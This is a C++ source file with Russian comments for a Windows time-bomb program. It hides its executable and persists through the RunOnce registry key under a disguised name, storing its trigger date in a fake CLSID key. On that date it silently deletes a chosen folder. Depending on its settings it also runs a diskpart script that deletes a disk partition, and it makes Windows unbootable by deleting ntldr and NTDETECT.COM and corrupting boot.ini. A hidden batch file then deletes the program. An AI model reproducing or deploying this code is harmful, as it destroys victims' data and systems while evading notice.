#include "stdafx.h"
#include "DeleteDay.h"

#include <string>
using namespace std;

static const wchar_t* RunOnceItemName = L"CTF Moniker";

//HKEY_CLASSES_ROOT
static const wchar_t* RegDataKeyName = L"CLSID\\{00000305-1111-0000-C000-A0B0C0000046}";

static const wchar_t* DelDayKeyName = L"delDay";
static const wchar_t* DelDayOfWeekKeyName = L"delDayOfWeek";
static const wchar_t* DelMonthKeyName = L"delMonth";
static const wchar_t* DelFolderKeyName = L"FolderToDel";
static const wchar_t* DelDiskDKeyName = L"delD";
static const wchar_t* KillWindowsKeyName = L"KillWin";

bool DeleteFolder();
bool PerformATask();
bool IfDeleteDiskD();
bool IfKillWindows();
void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[]);
void KeyBoardLedBlink(void);
void DoKillWindows();

CDeleteDay::CDeleteDay()
{
}

CDeleteDay::~CDeleteDay()
{
}

// //добавляем себя автозагрузку
bool CDeleteDay::AddToAutoRun()
{
	CString csExePath;
	DWORD dwSize = 512;
	GetModuleFileName(NULL, csExePath.GetBuffer(dwSize), dwSize);
	TRACE1("Путь к программе = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//добавить себя в автозагрузку
	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
	//достигнута дата срабатывания
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в AddToAutorun()");
		return false;
	}

	return true;
}

// записываем в реестр когда выполнится задача
bool CDeleteDay::SaveDeleteDay(SYSTEMTIME SysTime)
{
	/*SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);

	m_MonthCalCtrl.GetCurSel(&SysTime);*/

	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);

	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("День удаления = %s\n", DeleteDay.GetString());

	HKEY hk;

	// создать ключ в HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL))
	{
		TRACE(L"Could not create the registry key in SaveDeleteDay().", L"Облом", MB_ICONERROR);
		return false;
	}

	RegCloseKey(hk);

	//===== сохраним день удаления ======
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName			//имя значения
		, REG_SZ
		, DeleteDay.GetString()
		, DeleteDay.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним день недели =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName			//имя значения
		, REG_SZ
		, DeleteWeek.GetString()
		, DeleteWeek.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним месяц =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName			//имя значения
		, REG_SZ
		, DeleteMonth.GetString()
		, DeleteMonth.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()");
		return false;
	}

	return true;
}

// записываем какую папку будем удалять
bool CDeleteDay::SaveFolderPathToDelete(CString csFolderPath)
{
	//CString csFolderPath(m_csPath.GetString());

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, csFolderPath.GetLength()) != ERROR_SUCCESS)
	{
		TRACE(L"Облом с SHSetValue() в SaveFolderPathToDelete()");
		return false;
	}

	return true;
}

void CDeleteDay::HideFile()
{
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t sz[600] = { L"\0" }; // Строка-помошник...

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

	//Retrieves the short path form of the specified path.
	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
		wcscpy(szFileExe, sz);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
}

bool CDeleteDay::EnableCrashOnCtrlScroll()
{
	HKEY hKey;

	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;

		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof(lpData)) != ERROR_SUCCESS)
		{
			TRACE(L"Облом с SHSetValue() в EnableCrashOnCtrlScroll()");
			return false;
		}
	}

	return true;
}

bool CDeleteDay::DeleteDiskD(void)
{
	CString csDeleteD("YES");

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в DeleteDiskD()");
		return false;
	}

	return true;
}

bool CDeleteDay::SaveTaskKillWindows()
{
	CString csKillWindows("YES");

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength()) != ERROR_SUCCESS)
	{
		TRACE(L"Облом с SHSetValue() в DeleteDiskD()\n");
		return false;
	}

	return true;
}

void CDeleteDay::SelfDelete()
{
	//удалить себя из автозагрузки
	HKEY hKey;

	if (::RegOpenKeyEx(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, NULL
		, KEY_ALL_ACCESS
		, &hKey) == ERROR_SUCCESS)
	{
		::RegDeleteValue(hKey, RunOnceItemName);
	}

	// Далее выделяем много памяти - лишним не будет %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };

	wchar_t sz[600]; // Строка-помошник...

	unsigned int iTmp;
	wchar_t* lpTmp;

	// Получаем путь к запущенному ехешнику
	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));

	// Преобразуем в имя файла в досовский вид
	if (GetShortPathName(szFileExe, sz, _MAX_PATH))
		wcscpy(szFileExe, sz);

	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
	{
		if (!wcsncmp(lpTmp, L"\\", 1))
			break;
	}

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

	//===== удалить саму себя =====
	wchar_t BATSTRING[1024] =
		L":Repeat\n"
		L"del \"%s\"\n" //команда на удаление экзешника
		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //удаление батника

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)
	{
		TRACE(L"Факн щет, файла System.bat нет и не будет\n");
	}

	//char sz[600]; // Строка-помошник...
	//создаем бат-файл ===========================================
	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		TRACE(L"Факн щет, текст в файл System.bat не удалось записать\n");
	}

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
}

// Проверить не наступил ли день выполнения задания
bool CDeleteDay::InspectDeleteData()
{
	CString DeleteDay, CurrentDay;
	
	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//получить дату удаления
	ReadRegDeleteDay( DelDay, DelDayOfWeek, DelMonth);
		
	//определить текущую дату
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);
	
	//сравнить даты, если совпадают, то ...
	//нужно сравнивать день, день недели и месяц по отдельности
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 && CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth )
	{
		TRACE0("Даты совпадают. Удаляем папку.\n");	
			
		//... выполнить задание
		PerformATask();
	
		return true;
	}
	
	return false;
}

bool DeleteFolder()
{
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	wstring csPath;

	typedef wstring::size_type strLength;

	CString cspvData;

	SHGetValue(HKEY_CLASSES_ROOT, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*формируем строку вида С:\\Новая папка\\ вместо С:\Новая папка\*/
	for (;;)
	{
		index = csPath.find(L"\\", index);

		if (index == -1)
			break;

		csPath.insert(index, L"\\");

		index += 2;
	}

	csPath = csPath + L'\0' + L'\0';

	SHFILEOPSTRUCT sh;
	sh.hwnd = NULL;
	sh.wFunc = FO_DELETE;
	sh.pFrom = csPath.c_str();
	sh.pTo = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;

	if (SHFileOperation(&sh) != 0)
	{
		TRACE1("Папка \"%s\" НЕ удалена.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool PerformATask(void)
{
	// Далее выделяем много памяти - лишним не будет %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"\0" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t szFileDiskPart[MAX_PATH] = { L"\0" };
	wchar_t szTempPath[MAX_PATH] = { L"\0" };

	wchar_t sz[600]; // Строка-помошник...

	unsigned int iTmp;
	wchar_t* lpTmp;

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем в имя файла в досовский вид
		wcsncpy(szFileExe, sz, sizeof(szFileExe));

	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
	{
		if (!wcsncmp(lpTmp, L"\\", 1))
			break;
	}

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

	GetTempPath(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке

									   //если удалить диск Д
	if (IfDeleteDiskD())
	{
		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
	}

	if (IfKillWindows())
	{
		//делаем загрузку винды невозможной
		DoKillWindows();
	}

	//удаляем выбранную папку
	DeleteFolder();

	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл

	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Делаем файл нормальным

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.

	SHDeleteKey(HKEY_CLASSES_ROOT, RegDataKeyName);
	//удаляем из автозагрузки
	SHDeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	KeyBoardLedBlink();

	return false; // И закрываемся
}

bool IfDeleteDiskD(void)
{
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");
	}

	if (DelD.Compare(L"YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");
	}

	if (csKillW.Compare(L"YES") == 0)
	{
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== получить день удаления папки =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня удаления.\n");
	}

	//конвертим строку в число
	DelDay = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить день недели =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня недели удаления.\n");
	}

	//конвертим строку в число
	DelDayOfWeek = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить месяц =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении месяца удаления.\n");
	}

	//конвертим строку в число
	Month = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	return;
}

void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//получить текущую дату
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);

	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;

	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[])
{
	wchar_t sz[600]; // Строка-помошник...
					 //создадим или во временной папке или в рабочем каталоге программы
	swprintf(szFileDiskPart, L"%sDiskpart.txt", (wcslen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributes(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные

															  //создаем diskpart сценарий ===========================================
	const wchar_t* DISKPARTSTRING = L"select disk 0\nselect partition 3\ndelete partition noerr override";
	//заполняем строку для записи в файл
	swprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFile((LPCTSTR)szFileDiskPart,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)
	{
		TRACE("Факн щет, файла Diskpart.txt нет и не будет\n");
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		TRACE("Факн щет, текст в файл Diskpart.txt не удалось записать");
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[])
{
	bool bDeleteD = IfDeleteDiskD();

	wchar_t BATSTRING[1024] =
		L":Repeat\n"
		L"del \"%s\"\n" //команда на удаление экзешника
		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //удаление батника		

	if (bDeleteD)
	{
		wcsncpy(BATSTRING,
			L":Repeat\n"
			L"del \"%s\"\n" //команда на удаление экзешника
			L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
			L"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
			L":Repeat1\n"
			L"del \"%s\"\n" //удаление батника
			L"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
	}

	wchar_t sz[600]; // Строка-помошник...
					 //создаем бат-файл ===========================================
	swprintf(szFileBat, L"%sSystem.bat", (wcslen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)
	{
		TRACE("Факн щет, файла System.bat нет и не будет");
		return false;
	}

	if (bDeleteD)
	{
		//заполняем строку для записи в файл
		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else
	{
		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		TRACE("Факн щет, текст в файл System.bat не удалось записать");
		return false;
	}

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	return true;
}

void KeyBoardLedBlink(void)
{
	for (int i = 0; i < 3; i++)
	{
		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_NUMLOCK;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_CAPITAL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_SCROLL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}
	}

	//==============================================
	//выполняется нажитие комбинации клавиш RCONTROL+SCROLL+SCROLL

	//INPUT input;
	//::ZeroMemory(&input, sizeof(input));	

	////нажимаем правый CONTROL
	//input.type = INPUT_KEYBOARD;
	//input.ki.wVk = VK_MENU;
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("Нажали правый CONTROL\n");

	//for (int c = 0; c < 2; c++)
	//	{
	//		INPUT inp;
	//		::ZeroMemory(&inp, sizeof(inp));

	//		inp.type = INPUT_KEYBOARD;
	//		inp.ki.wVk = VK_PRINT;
	//		inp.ki.dwFlags = 0;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("Нажали на CSROLL\n");
	//		
	//		inp.ki.dwFlags = KEYEVENTF_KEYUP;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("Отпустили CSROLL\n");

	//		Sleep(500);
	//	}

	////отпускаем правый CONTROL
	//input.ki.wVk = VK_MENU;
	//input.ki.dwFlags = KEYEVENTF_KEYUP;	
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("Отпустили правый CONTROL\n");

	//==============================================
	TRACE0("Типа нажали на все педали.\n");
}

void DoKillWindows()
{
	//remove();
	const int INFO_BUFFER_SIZE = 100;

	CString SystemDisk;

	//на каком диске стоит винда?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory(SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//нам нужна только буква диска, обрезаем не нужное
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);

	//===== 1 удалить ntldr =====
	CString csFileName = SystemDisk + L"\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");

	//===== 2 удалить ntdetect.com =====
	csFileName = SystemDisk + L"\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");

	//===== 3 изменить boot.ini =====
	CFile BootIniFile;

	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + L"\\boot.ini";

	//--- читаем файл ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		TRACE("Не удалось открыть файл");
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));

	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());

	//--- записываем файл ---
	CString csBootINI(readBuffer);

	csBootINI.Replace(L"partition(1)", L"partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite | CFile::modeCreate))
	{
		TRACE("Не удалось открыть файл");
		return;
	}

	BootIniFile.Write(csBootINI, BytesRead);

	BootIniFile.Close();

	//делаем как было...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}